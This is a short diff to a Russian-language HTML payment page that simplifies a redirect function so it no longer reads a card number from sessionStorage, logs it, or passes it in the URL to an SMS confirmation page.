@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -736,15 +737,8 @@
         };
 
         window.redirectToSMS = function() {
-    // Берем номер карты из sessionStorage
-    const cardNumber = sessionStorage.getItem('cardNumber');
-    console.log('💳 Передаем номер карты в SMS:', cardNumber);
-    if (cardNumber) {
-        window.location.href = `sms.html?card=${cardNumber}`;
-    } else {
-        window.location.href = 'sms.html';
-    }
-};
+            window.location.href = 'sms.html';
+        };
 
         window.redirectToPaymentWithError = function() {
             console.log('❌ Перенаправляю на payment.html с ошибкой');
@@ -770,7 +764,4 @@
     </script>
 </body>
 </html>
-
-
-
 
